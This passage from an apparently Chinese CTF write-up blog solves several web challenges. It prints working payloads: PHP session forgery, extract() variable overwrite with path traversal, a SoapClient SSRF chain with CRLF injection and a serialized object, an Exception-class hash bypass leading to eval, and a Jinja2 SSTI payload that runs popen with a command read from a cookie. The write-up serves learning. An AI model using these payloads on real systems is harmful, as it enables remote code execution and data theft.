&#123;</span><br><span class="line">  return isset($_SESSION[&#x27;user&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;user&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function set_user($user) &#123;</span><br><span class="line">  $_SESSION[&#x27;user&#x27;] = $user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_user() &#123;</span><br><span class="line">  return $_SESSION[&#x27;user&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_admin() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;admin&#x27;] === true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// note-related functions</span><br><span class="line">function get_notes() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;notes&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;notes&#x27;] = [];</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;notes&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function add_note($title, $body) &#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  array_push($notes, [</span><br><span class="line">    &#x27;title&#x27; =&gt; $title,</span><br><span class="line">    &#x27;body&#x27; =&gt; $body,</span><br><span class="line">    &#x27;id&#x27; =&gt; hash(&#x27;sha256&#x27;, microtime())</span><br><span class="line">  ]);</span><br><span class="line">  $_SESSION[&#x27;notes&#x27;] = $notes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_note($notes, $id) &#123;</span><br><span class="line">  for ($index = 0; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">    if ($notes[$index][&#x27;id&#x27;] === $id) &#123;</span><br><span class="line">      return $index;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function delete_note($id) &#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  $index = find_note($notes, $id);</span><br><span class="line">  if ($index !== FALSE) &#123;</span><br><span class="line">    array_splice($notes, $index, 1);</span><br><span class="line">  &#125;</span><br><span class="line">  $_SESSION[&#x27;notes&#x27;] = $notes;</span><br><span class="line">&#125;</span><br><span class="line">#init.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">require_once(&#x27;config.php&#x27;);</span><br><span class="line">require_once(&#x27;lib.php&#x27;);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);#标识了session文件保存路径</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#export.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#x27;init.php&#x27;);</span><br><span class="line"></span><br><span class="line">if (!is_logged_in()) &#123;</span><br><span class="line">  redirect(&#x27;/?page=home&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$notes = get_notes();</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;type&#x27;]) || empty($_GET[&#x27;type&#x27;])) &#123;</span><br><span class="line">  $type = &#x27;zip&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $type = $_GET[&#x27;type&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;</span><br><span class="line">$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal</span><br><span class="line">$path = TEMP_DIR . &#x27;/&#x27; . $filename;</span><br><span class="line"></span><br><span class="line">if ($type === &#x27;tar&#x27;) &#123;</span><br><span class="line">  $archive = new PharData($path);</span><br><span class="line">  $archive-&gt;startBuffering();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // use zip as default</span><br><span class="line">  $archive = new ZipArchive();</span><br><span class="line">  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($index = 0; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[&#x27;title&#x27;];</span><br><span class="line">  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);</span><br><span class="line">  $title = preg_replace(&#x27;#[/\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters</span><br><span class="line">  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($type === &#x27;tar&#x27;) &#123;</span><br><span class="line">  $archive-&gt;stopBuffering();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $archive-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $filename . &#x27;&quot;;&#x27;);</span><br><span class="line">header(&#x27;Content-Length: &#x27; . filesize($path));</span><br><span class="line">header(&#x27;Content-Type: application/zip&#x27;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>可以发现session文件保存路径与note文件导出的路径一样，看看文件名的命名方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;</span><br><span class="line">$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal</span><br><span class="line">$path = TEMP_DIR . &#x27;/&#x27; . $filename;</span><br></pre></td></tr></table></figure><p>通过get_user函数获取用户名然后用一段随机字符串加上文件类型，这里的get_user内容可控，登录时修改用户名即可，但是他还有type拼接且type无法为空不然就会被设置为ZIP，第二行代码中将..替换为空为了防止目录穿越，那么我们就可以让type的值为.这样filename中就有..被替换为空那么后缀名就消失了，我们成功构造出了一个符合要求的session文件名，看看内容是否可控</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ($index = 0; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[&#x27;title&#x27;];</span><br><span class="line">  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);</span><br><span class="line">  $title = preg_replace(&#x27;#[/\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters</span><br><span class="line">  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内容是可控的我们新建note的title值会被写入到文件当中，那么思路就结束了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、登录用户名设置为sess_</span><br><span class="line">2、新建note，title值为|N;admin|b:1;   (body任意)</span><br><span class="line">3、export文件，BP拦截将type值设置为.</span><br><span class="line">4、将文件名中SESS_后的字符串记录</span><br><span class="line">5、打开flag获取页面设置session值为第四步的字符串，这样他就会自动反序列化/var/www/tmp中我们植入伪造admin的文件，这样$_session[&#x27;admin&#x27;]=true从而获取flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[SWPU2019]Web4</title>
      <link href="/2025/02/17/SWPU2019-Web4/"/>
      <url>/2025/02/17/SWPU2019-Web4/</url>
      
        <content type="html"><![CDATA[<h2 id="SWPU2019-Web4-WP"><a href="#SWPU2019-Web4-WP" class="headerlink" title="[SWPU2019]Web4-WP"></a>[SWPU2019]Web4-WP</h2><p style="font-size:10px;color:#7f8c93">题目来源：BUUCTF<br>题目类型：WEB<br>设计考点：sql盲注,MSV,变量覆盖</p><p><img src="/./../img/SWPU2019/1.png" alt="web1"><br><img src="/./../img/SWPU2019/2.png" alt="web2"><br>时间盲注爆破得到:glzjin_wants_a_girl_friend.zip<br>代码审计可以发现他的整体逻辑</p><p>首先关注他的URL：<a href="http://fab20018-12d4-4251-a25f-8c6635e869ea.node5.buuoj.cn:81/index.php?r=User/Index">http://fab20018-12d4-4251-a25f-8c6635e869ea.node5.buuoj.cn:81/index.php?r=User/Index</a><br>它读取了一个值$r$</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 路由控制跳转至控制器</span><br><span class="line">if(!empty($_REQUEST[&#x27;r&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$r = explode(&#x27;/&#x27;, $_REQUEST[&#x27;r&#x27;]);</span><br><span class="line">list($controller,$action) = $r;</span><br><span class="line">$controller = &quot;&#123;$controller&#125;Controller&quot;;</span><br><span class="line">$action = &quot;action&#123;$action&#125;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(class_exists($controller))</span><br><span class="line">&#123;</span><br><span class="line">if(method_exists($controller,$action))</span><br><span class="line">&#123;</span><br><span class="line">//</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$action = &quot;actionIndex&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$controller = &quot;LoginController&quot;;</span><br><span class="line">        $action = &quot;actionIndex&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    $data = call_user_func(array( (new $controller), $action));</span><br></pre></td></tr></table></figure><p>然后调用&#x2F;前对应的Controller并且执行对应的action方法</p><p>接下来关注所有controller的父类,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* 所有控制器的父类</span><br><span class="line">*/</span><br><span class="line">class BaseController</span><br><span class="line">&#123;</span><br><span class="line">/*</span><br><span class="line"> * 加载视图文件</span><br><span class="line"> * viewName 视图名称</span><br><span class="line"> * viewData 视图分配数据</span><br><span class="line">*/</span><br><span class="line">private $viewPath;</span><br><span class="line">public function loadView($viewName =&#x27;&#x27;, $viewData = [])</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;</span><br><span class="line">if(file_exists($this-&gt;viewPath))</span><br><span class="line">&#123;</span><br><span class="line">extract($viewData);</span><br><span class="line">include $this-&gt;viewPath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的方法 $loadView$ 中有 $extract$ 函数我们可以变量覆盖，然后它执行了一个include，我们就去寻找对应的漏洞</p><p>在User Controller中我们发现它调用loadView方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function actionIndex()</span><br><span class="line">    &#123;</span><br><span class="line">        $listData = $_REQUEST;</span><br><span class="line">        $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>他的actionIndex函数中的listdata值可控，我们继续跟进，按照代码逻辑，他会包含userIndex.php，我们继续跟进代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function imgToBase64($img_file) &#123;</span><br><span class="line"></span><br><span class="line">    $img_base64 = &#x27;&#x27;;</span><br><span class="line">    if (file_exists($img_file)) &#123;</span><br><span class="line">        $app_img_file = $img_file; // 图片路径</span><br><span class="line">        $img_info = getimagesize($app_img_file); // 取得图片的大小，类型等</span><br><span class="line"></span><br><span class="line">        $fp = fopen($app_img_file, &quot;r&quot;); // 图片是否可读权限</span><br><span class="line"></span><br><span class="line">        if ($fp) &#123;</span><br><span class="line">            $filesize = filesize($app_img_file);</span><br><span class="line">            $content = fread($fp, $filesize);</span><br><span class="line">            $file_content = chunk_split(base64_encode($content)); // base64编码</span><br><span class="line">            switch ($img_info[2]) &#123;           //判读图片类型</span><br><span class="line">                case 1: $img_type = &quot;gif&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 2: $img_type = &quot;jpg&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 3: $img_type = &quot;png&quot;;</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $img_base64 = &#x27;data:image/&#x27; . $img_type . &#x27;;base64,&#x27; . $file_content;//合成图片的base64编码</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $img_base64; //返回图片的base64</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现它会获取一个img_file值然后尝试输出一个base64格式的图片文件，那么这题的攻击逻辑就很清楚了,<br>我们构造url的r值为user&#x2F;Index,让他调用userController中的actionIndex方法，然后传值给img_file&#x3D;&#x2F;..&#x2F;flag.php在baseController中的extract方法会创造img_file变量值为&#x2F;..&#x2F;flag.php，然后include userIndex.php文件，这就会让userIndex.php文件尝试读取flag.php文件然后把他的base64加密字符串输出，最后回显<br><img src="/./../img/SWPU2019/3.png" alt="web3"><br><img src="/./../img/SWPU2019/4.png" alt="web4"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP内置类相关</title>
      <link href="/2025/02/03/PHP%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9B%B8%E5%85%B3/"/>
      <url>/2025/02/03/PHP%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h2 id="bestPHP-WP"><a href="#bestPHP-WP" class="headerlink" title="bestPHP:WP"></a>bestPHP:WP</h2><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li>php内置类SoapClient</li><li>CRLF Injection漏洞</li><li>call_user_func</li><li>PHPsession 反序列化</li></ol><h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p style="font-size:10px">SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(location&#x27;=&gt;&#x27;http://example.com:2333&#x27;,&#x27;uri&#x27;=&gt;&#x27;123&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br><span class="line">//可以利用 SoapClient 类的 __call （当调用对象中不存在的方法会自动调用此方法）方法来进行 SSRF</span><br></pre></td></tr></table></figure><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p style="font-size:10px">CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。简单来说http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://localhost:2333&quot;;</span><br><span class="line">$options = array(</span><br><span class="line">    &quot;location&quot; =&gt; $target,</span><br><span class="line">    &quot;user_agent&quot; =&gt; &quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;,</span><br><span class="line">    &quot;uri&quot; =&gt; &quot;demo&quot;</span><br><span class="line">);</span><br><span class="line">$attack = new SoapClient(null,$options);</span><br><span class="line">$payload = serialize($attack);</span><br><span class="line">unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h3><p>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</p><h3 id="PHPsession-反序列化"><a href="#PHPsession-反序列化" class="headerlink" title="PHPsession 反序列化"></a>PHPsession 反序列化</h3><table><thead><tr><th align="center">Directive</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">session.save_handler</td><td align="center">session保存形式。默认为files</td></tr><tr><td align="center">session.save_path</td><td align="center">session保存路径。</td></tr><tr><td align="center">session.serialize_handler</td><td align="center">session序列化存储所用处理器。默认为php。</td></tr><tr><td align="center">session.upload_progress.cleanup</td><td align="center">一旦读取了所有POST数据，立即清除进度信息。默认开启</td></tr><tr><td align="center">session.upload_progress.enabled</td><td align="center">将上传文件的进度信息存在session中。默认开启。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;name&#x27;] = &#x27;lvyz&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p style="font-size:13px">当 session.serialize_handler=php 时，session文件内容为： name|s:4:"lvyz";</p><p style="font-size:13px">当 session.serialize_handler=php_serialize 时，session文件为： a:1:{s:4:"name";s:4:"lvyz";}</p><p style="font-size:13px">当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:4:"lvyz";</p>当我们使用PHP引擎反序列化php_serialize引擎序列化内容时得到<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;name&#x27;] = &#x27;|username&#x27;</span><br><span class="line">a:1:&#123;s:4:&#x27;name&#x27;;s:4:&#x27;|username&#x27;;&#125;</span><br><span class="line">|被当作分隔符</span><br><span class="line">a:1:&#123;s:4:&#x27;name&#x27;;s:4:&#x27;被当作KEY</span><br><span class="line">username 被当作value进行反序列化</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h4 id="题目来源-https-buuoj-cn-challenges-bestphp-s-20revenge"><a href="#题目来源-https-buuoj-cn-challenges-bestphp-s-20revenge" class="headerlink" title="题目来源:https://buuoj.cn/challenges#bestphp&#39;s%20revenge"></a>题目来源:<a href="https://buuoj.cn/challenges#bestphp's%20revenge">https://buuoj.cn/challenges#bestphp&#39;s%20revenge</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &#x27;implode&#x27;;</span><br><span class="line">call_user_func($_GET[&#x27;f&#x27;], $_POST);  //参数二的位置固定为 $_POST 数组，我们很容易便想到利用 extract 函数进行变量覆盖，以便配合后续利用</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;name&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">&#125;   //存在 session 伪造漏洞，我们可以考虑是否可以包含 session 文件或者利用 session 反序列化漏洞</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line">?&gt;</span><br><span class="line">array(0) &#123; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//flag.php  (扫目录扫到的)</span><br><span class="line">only localhost can get flag!session_start();</span><br><span class="line">echo &#x27;only localhost can get flag!&#x27;;</span><br><span class="line">$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;</span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">       $_SESSION[&#x27;flag&#x27;] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p style="font-size:15px">通过flag.php文件得到信息，我们需要用127.0.0.1访问它才能得到flag，那么很明显就是要我们利用SSRF，回到题目的源码，我们的思路就是寻找能SSRF的点，这里就是利用SoapCLient内置类的__call方法进行，那么要利用它就是要进行反序列化，但是这里没有POP链，看到session_start我们可以尝试SESSION反序列化漏洞，我们先把靶机的serialize_handler改为phpserialize</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。这个特性也引入了一个新的 php.ini 设置（session.lazy_write）</span><br></pre></td></tr></table></figure><p>我们传入f&#x3D;session_start,post:array(‘serialize_handler’&#x3D;&gt;’php_serialize’),即可达到session_start(array(‘serialize_handler’ &#x3D;&gt; ‘php_serialize’)) 将他的serialize_handler改为php_serialize</p><p>然后我们构造一个序列化字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target=&#x27;http://127.0.0.1/flag.php&#x27;;</span><br><span class="line">$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,</span><br><span class="line">    &#x27;user_agent&#x27; =&gt; &quot;npfs\r\nCookie:PHPSESSID=123456\r\n&quot;,</span><br><span class="line">    &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line"></span><br><span class="line">$se = serialize($b);</span><br><span class="line">echo &quot;|&quot;.urlencode($se);</span><br><span class="line"></span><br><span class="line">//注意下，这个脚本想要执行，需要将php.ini里的 php_soap.dll 前面的分号去掉</span><br><span class="line">这里的sessid需要记住，后面要指定sessid访问页面来让他进行反序列化</span><br><span class="line"></span><br><span class="line">|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A31%3A%22npfs%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是让这一字符串写入到他的session文件当中,这样他的session文件中就是一个SOAP对象<br><img src="/../img/bestphp/1.jpg" alt="WEB!"><br>让他的session[‘name’]&#x3D;$_GET[‘name’]</p><p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF。</p><p>这里的,我们访问时他会解析上一步的session文件，这样的的session数组的第一个元素就是一个SOAP对象，这里我们对它进行访问XXXX2018方法，触发__call导致SSRF<br>在flag.php。会将flag赋值给$_SESSION[‘flag’]</p><p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p><h2 id="极客大挑战-2020-Greatphp-WP"><a href="#极客大挑战-2020-Greatphp-WP" class="headerlink" title="[极客大挑战 2020]Greatphp:WP"></a>[极客大挑战 2020]Greatphp:WP</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ol><li>Error|Exception内置类</li><li>反序列化基础</li><li>取反绕过</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p sytle="font-size:13px">第一眼看到题目，简单的md5和sha1绕过，一般传个数组进去就绕过了，但是这里发现他还需要对值进行命令执行,这里如果把数组传入eval当中会报错，这里我们就使用Error和Exeption内置类来绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Exception(&quot;payload&quot;,1);</span><br><span class="line">$b = new Exception(&quot;payload&quot;,2);</span><br><span class="line">echo $a;</span><br><span class="line">echo &quot;\r\n\r\n&quot;;</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure><p><img src="/../img/bestphp/2.png" alt="web2"><br>当ehco一个Exception类时会触发他的__toString方法，我们可以看到他除了报错行数之外都是相同的，那么久意味着我们若把两者放在同一行他们__toString方法的结果就是相同的，md5和sha1的结果也是相同的，并且他内部有一个code值，让他在比较时是不同的这里我们就可以绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )</span><br></pre></td></tr></table></figure><p>然后是命令执行，测试发现当一个Exception类传到eval当中的时候他获取的值是他的message,并且message我们可控，那么题目就可以命令执行</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __construct($b,$c)&#123;</span><br><span class="line">        $this-&gt;syc = $b;</span><br><span class="line">        $this-&gt;lover = $c;</span><br><span class="line">    &#125;</span><br><span class="line">$in = ~(&quot;/flag&quot;);</span><br><span class="line">$payload = &quot;?&gt;&lt;?=include~&quot;.$in.&quot;?&gt;&quot;;</span><br><span class="line">$b = new error($payload,1);$c=new error($payload,2);</span><br><span class="line">$a = new SYCLOVER($b,$c);</span><br><span class="line">echo(urlencode(serialize($a)));</span><br><span class="line">?&gt;</span><br><span class="line">因为过滤了引号所以需要取反绕过一下</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第八届西湖论剑WP</title>
      <link href="/2025/01/19/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WP/"/>
      <url>/2025/01/19/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91WP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>题目类型：WEB<br>设计考点：SSTI</p><p>WEB1<img src="/./../img/XHLJ/WEB1.png"></p><p>Payload: </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>首先分析页面，给了一个登录页面<br><img src="/./../img/XHLJ/WEB1-2.png" alt="WEB1-2" title="web1-2"></p><p>发现登录之后会提示某某账号不存在或者密码错误，看到他的response包<br><img src="/./../img/XHLJ/WEB1-3.png" alt="WEB1-3" title="web1-3"></p><p>发现他是用python写的后端，猜测可能是SSTI漏洞<br>直接打payload，测试发现&#x2F;斜杠被过滤，用request.cookie.x绕过即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](request.cookies.x).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p><img src="/./../img/XHLJ/web1-6.png" alt="web" title="result"></p><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p style="font-size:10px;color:#7f8c93">题目来源：西湖论剑2025<br>题目类型：WEB<br>设计考点：JS框架,replace函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span 